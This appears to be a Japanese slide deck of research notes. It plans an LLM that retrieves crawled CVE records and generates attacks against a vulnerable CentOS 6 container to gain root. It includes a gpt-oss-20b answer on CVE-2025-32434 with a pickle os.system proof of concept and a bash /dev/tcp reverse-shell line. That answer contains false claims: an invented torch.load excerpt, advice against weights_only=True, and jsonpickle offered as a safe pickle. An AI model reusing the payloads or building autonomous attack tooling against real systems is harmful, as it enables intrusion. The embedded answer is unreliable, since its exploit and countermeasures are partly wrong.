---
marp: false
math: mathjax
header: "ESL輪読"
paginate: true
style: |
  strong {
    color: #F79428;
  }
  em {
    font-style: normal;
    color: #0B3E8D;
    font-weight: bold;
  }
  h1 {
    color: #0B3E8D;
  }
  h2 {
    color: #0B3E8D;
    margin-bottom:-.2em;
  }
  h2 strong {
    color: chocolate;
  }
  h3 {
    color: #0B3E8D;
    margin-bottom:-.1em;
  }
  h3 strong {
    color: chocolate;
  }
  .columns {
    display: grid;
    grid-template-columns: repeat(2, minmax(0, 1fr));
    gap: 1rem;
  }
  .columns.var {
    display: grid;
    grid-template-columns: var(--ratio) 1fr;
    gap: 1rem;
  }
  .columns.spaced {
    display: grid;
    grid-template-columns: var(--ratio) 10% 1fr;
    gap: 1rem;
  }
  .gray {
    background: whitesmoke;
  }
  .theorem {
    background: whitesmoke;
    padding-top: 0.1em;
    padding-bottom: 0.1em;
    padding-left: 0.4em;
  }
  .statement {
    margin-top: -0.5em;
    padding-left: 0.7em;
  }
  .quote {
    background: whitesmoke;
    margin-left: 5%;
    margin-right: 5%;
    margin-bottom: 3%;
  }
  .quote.white {
    background: white;
  }  .katex .delimcenter,
  .katex .op-symbol {
    display: inline-block;
  }  
  .arrow {
    margin-top: auto;
    margin-bottom: auto;
    margin-left: auto;
    margin-right: auto;
    width: 0; 
    height: 0;   
  }
  .arrow.right {
    border-top: 40px solid transparent;
    border-bottom: 40px solid transparent;
    border-left: 40px solid gray;
  }
  .arrow.down {
    border-left: 40px solid transparent;
    border-right: 40px solid transparent;
    border-top: 40px solid gray;
  }
  .arrow.up {
    border-left: 40px solid transparent;
    border-right: 40px solid transparent;
    border-bottom: 40px solid gray;
  }
  .center {
    margin-right: auto;
    margin-left: auto;
    text-align: center; 
  }
  .middle {
    margin-top: auto;
    margin-bottom: auto;
  }
  .large {
    font-size: 28pt;
  }
  .hline {
    margin-top:20px;
    margin-bottom:20px;
    margin-left: 0%;
    margin-right: 0%;
    width: 1fr; 
    height: 0;   
    border-top: 2px solid gray;
  }
  .vline {
    margin-top:0%;
    margin-bottom:0%;
    margin-left: 20px;
    margin-right: 20px;
    width: 0; 
    height: 1fr;   
    border-left: 2px solid gray;
  }
  .shade {
    width: 1fr;
    background: white;
    opacity: 0.7;   
  }
  .white {
    width: 1fr;
    background: white;
  }
  .images {
    float: left;
  }
---
## Task
1. 過去の攻撃(CVE)等のDBを元に作ったRAGで攻撃を行うLLMを作る\
1.1. CVE等のサイトをクローリングして、脆弱性を集める\
1.2. DBを作る\
1.3. RAGとして、LLMに接続\
1.4. LLMが攻撃を応答として生成できるように\
1.5. Dockerで作った脆弱な環境(centOS 6等)に接続\
1.6. suをとるために攻撃を試みる\
1.7. 攻撃の際の傾向があれば、そこから未知の脆弱性を使った攻撃を行えるように発展させていく。
2. ソースコードを入力として、脆弱性を応答として返すLLMを作る
2.1. 脆弱なアプリケーションを探す\
2.2. ソースコードを取得(一旦特定の言語に絞る)\
2.3. そのアプリケーションの脆弱性を探して、FTをかける\
2.4. LLMに入力として与えて、新規の脆弱性を探せないか試す\
2.5. 別のサービスにもその脆弱性がないか

ある脆弱性から類推して脆弱性を見つけられるとよい？

## クローリングを行う
### 対象
対象1: CVE - nist foundation\
Linuxに対する脆弱性の記載が少なく、特定のソフトウェアに起因する脆弱性が多く報告されている傾向(Irfan view 等)
> https://nvd.nist.gov/c\
> https://nvd.nist.gov/vuln/search#/nvd/home?resultType=records

対象2: RedHat\
RedHat Enterprise Linux上で動くソフトウェアに関する脆弱性がまとめられており、特権昇格に繋がりそうな脆弱性やOSに関する脆弱性が少ない。
> https://access.redhat.com/security/security-updates/cve?q=Linux&p=1&sort=lastModifiedDate+desc,allTitle+desc&rows=10&documentKind=Cve&showOnlyRedHatCVEs=true&cve_dateOption=Date+range&cve_startDate=2020-12-01&cve_endDate=2025-10-09

対象3: JVN iPedia\
CentOS6のサポート終了後の2020/12 ~ 2025/10の間のLinux関連の脆弱性\
累計 2060件
> https://jvn.jp/\
> https://jvndb.jvn.jp/\
> https://jvndb.jvn.jp/search/index.php?mode=_vulnerability_search_IA_VulnSearch&lang=ja&keyword=Linux&useSynonym=1&vendor=&product=&datePublicFromYear=2020&datePublicFromMonth=12&datePublicToYear=2025&datePublicToMonth=11&dateLastPublishedFromYear=&dateLastPublishedFromMonth=&dateLastPublishedToYear=&dateLastPublishedToMonth=&v3Severity%5B%5D=01&v3Severity%5B%5D=02&cwe=&searchProductId= 

例: pytorch < 2.6.0 の任意コード実行の脆弱性をついた任意コード実行
```
inputs: 
You are an assistant supporting the learning of security engineers.
Please output responses in Japanese.
Summarize the following vulnerability. Also, consider countermeasures after providing source code demonstrating how it can be exploited.
# CVE-2025-32434
## Title: PyTorch: `torch.load` with `weights_only=True` leads to remote code execution
### Description
PyTorch is a Python package that provides tensor computation with strong GPU acceleration and deep neural networks built on a tape-based autograd system. In version 2.5.1 and prior, a Remote Command Execution (RCE) vulnerability exists in PyTorch when loading a model using torch.load with weights_only=True. This issue has been patched in version 2.6.0.
```

gpt-oss-20b

```python
outputs: 
### 1. まずは概要

* 対象：PyTorch 2.5.1 以前のバージョン
* 漏洞ポイント：`torch.load` を `weights_only=True` で呼び出した際、pickle データを復号する処理に不備がある。
* 影響：任意の pickle ペイロードを受け取ったサーバー側で、Python の **`pickle.loads`** が実行され、任意の Python オブジェクト（関数やクラスのインスタンス）を作成できる。
* その結果、悪意あるコードを含むオブジェクトをシリアライズして送信することで、サーバ側でそのコードが即時に実行され、**リモートコマンド実行（RCE）** につながる。
* 2025 年 6 月 7 日、PyTorch 2.6.0 でこの問題は修正されており、`weights_only=True` の時に「安全な」データだけをロードできるよう改修されている。

---

## 2. 漏洞の技術的根拠

`torch.load` は、内部で `torch.serialization` モジュールの `load` 関数を呼び、`pickle` ライブラリを用いてオブジェクトを復号する。
`weights_only=True` のときは以下のように実装されている（抜粋）:

def _load_from_source(self, src, map_location=None,
                      pickle_module=_pickle, weights_only=False):
    # 省略…
    if weights_only:
        # weights のみを復元
        weights = pickle_module.loads(data, **kwargs)
        # ここで復元されたオブジェクトが **任意の pickle ペイロード** であれば、その実行コードが走る

しかし、`pickle.loads` は「任意の Python オブジェクト」を生成するため、**オブジェクトに含まれる `__reduce__` や `__getstate__`** を介して任意のコードを実行できる。
そのため、`weights_only=True` を無視して、悪意あるフォーマットの `model.pth` を送信すれば、サーバ側で無条件にコードが実行されてしまう。

---

## 3. 攻撃コード例（教育目的）

以下は、**攻撃者側**が生成し、`torch.load` を呼び出す側に送信することができる、最小限の悪意な `pickle` ペイロードです。
実際に破壊的なコードを実行しないように、シンプルな「Hello, World!」を標準出力に出力するだけに留めています。

> **重要**：以下のコードは**学習・テスト目的のみ**で利用してください。本番環境や実運用に使用しないでください。

import pickle
import torch

# 1. 送信側：pickle で悪意あるオブジェクトを生成
class Malicious:
    def __reduce__(self):
        # このメソッドが呼ばれることで、任意のコードが実行される
        import os
        # 例として、/tmp/shell_command.txt に「Hello, World!」を書き込む
        return (os.system, ("echo 'Hello, World!' > /tmp/shell_command.txt",))

# オブジェクトをシリアライズ
payload = pickle.dumps(Malicious())

# 2. 受信側（脆弱な PyTorch 環境）でのロード
# `torch.load` でシリアライズ済みデータをロードし、`weights_only=True` を指定
# ここで、pickle のコードが実行されます
with open('malicious.pth', 'wb') as f:
    f.write(payload)    # 実際には悪意あるファイル名を使用

# **脆弱な環境で実行**（例）
# まず、受信側で `torch.load` を呼び出す
torch.load('malicious.pth', weights_only=True)

> **ポイント**
> * `pickle` で生成したオブジェクトの `__reduce__` で `os.system` を呼び出し、任意のコマンドを実行
> * `torch.load` が `weights_only=True` だが、内部で `pickle` そのままロードしているため、ロード時に任意コードが実行される
> * この例では `echo 'Hello, World!'` だけで済みますが、実際には `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` などのリバースシェルを実装可能です。

> **備考**
> * このコードは「悪意ある**pickleペイロード**」だけで、PyTorch の内部実装を介さずに実行されます。
> * 実際に本番環境に対して実行すると、重要データの漏洩やシステム破壊につながります。

---

## 4. 予防策・対策

| 項目 | 詳細 |
|------|------|
| **バージョンアップ** | PyTorch 2.6.0 以降に更新するだけで、この脆弱性は完全に排除されています。 |
| **安全なデータロード** | `torch.load` を使用する際は、`weights_only=True` を**使用しない**か、`torch.load` の代わりに `torch.jit.load` などを検討。 |
| **入力データの検証** | 受信するファイルは、常に署名付き（またはチェックサム）であることを確認し、信頼できるソースからのみ取り込み。 |
| **pickle の使用制限** | `torch.load` を呼び出す前に、`torch.serialization` モジュールにおいて `pickle_module` を標準の `pickle` から `safe_pickle`（例：`jsonpickle` など）に差し替えて、任意コード実行を防止。 |
| **サンドボックス化** | PyTorch を実行する環境をコンテナ化し、最低限の権限で実行して、悪意あるコードの実行を隔離。 |
| **監査・ログ** | ファイルのロード時に、データのハッシュ（SHA256）やファイルサイズ、型情報をログに残し、異常を検知。 |
| **構成管理** | CI/CD パイプラインにおいて、`torch.load` で読み込むモデルファイルを自動で署名検証する仕組みを入れる。 |

---

## 5. まとめ

- **CVE-2025-32434** は、PyTorch 2.5.1 以前において、`torch.load(..., weights_only=True)` が不適切に動作し、pickle ペイロードを通じてリモートコード実行が可能となる脆弱性です。
- 具体的な攻撃例として、pickle の `__reduce__` で任意コードを実行する小規模なペイロードを作成し、`torch.load` がそれを読み込むことでコードが実行される仕組みが説明できます。
- **対策**として、PyTorch の 2.6.0 以上への更新、入力ファイルの署名検証、コンテナ化・サンドボックス化、そして安全なコードロード手順を徹底する必要があります。

安全に開発・運用するために、これらのポイントを実装時に必ず確認してください。<|return|>
```

JVNDB-2025-005907 - JVN iPedia - 脆弱性対策情報データベース
> https://jvndb.jvn.jp/ja/contents/2025/JVNDB-2025-005907.html

有料DB系(未検証):
> https://vuldb.com/ja/?product\
> https://www.wiz.io/ja-jp/vulnerability-database/cve/search\

### 方法
方法1: scrapy\
scrapy_test.ipynbを参照\
cssセレクタについて勉強する必要あり
> https://docs.scrapy.org/en/latest/

1から書くと面倒くさいのでLLMに聞こう

jqの絞り込み
> https://www.tohoho-web.com/ex/jq.html \
> https://qiita.com/hideki_okawa/items/32f9580e1de6802eb776#%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E7%B5%9E%E3%82%8A%E8%BE%BC%E3%81%BF

方法2: 気合\
./JVN.json に2025年分は取得済み

## DBを作る
集めたデータ(json)に埋め込みをかけ、ベクトルDBを作りたい

pythonのlangchainならできそう
> https://note.com/npaka/n/n95d9b6b33309#9d322234-d2fd-4dcf-816d-c8e0514439ce

実例: ollama + gpt-oss-20b + 入力文章でローカルRAG
> https://digeon.co/blog/ollama-gpt-oss-local-rag-app
